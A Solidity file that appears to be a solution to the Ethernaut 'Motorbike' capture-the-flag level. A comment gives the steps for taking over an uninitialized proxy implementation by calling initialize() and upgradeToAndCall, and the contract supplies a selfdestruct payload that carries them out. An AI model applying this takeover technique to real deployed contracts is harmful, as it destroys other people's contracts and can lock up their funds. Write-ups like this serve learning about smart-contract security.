pragma solidity 0.8.7;

/**
 * Solution: 
 * 1. Get Engine address(Implementaion contract) from 'await web3.eth.getStorageAt(instance,_IMPLEMENTATION_SLOT)'
 * 2. Directly call initialize() by EOA or Attack contract (In my solution, use EOA)
 * 3. Directly call upgradeToAndCall(address newImplementation, bytes memory data) with ATTACK_CONTRACT_ADDRESS, BYTE encoding Attack function, respectively
 */
contract MotorbikeHack {
    function attack() external payable {
        selfdestruct(payable(tx.origin));
    }

    function encoding() external pure returns(bytes memory){
        bytes memory result = abi.encodeWithSignature("attack()");
        return result;
    }
}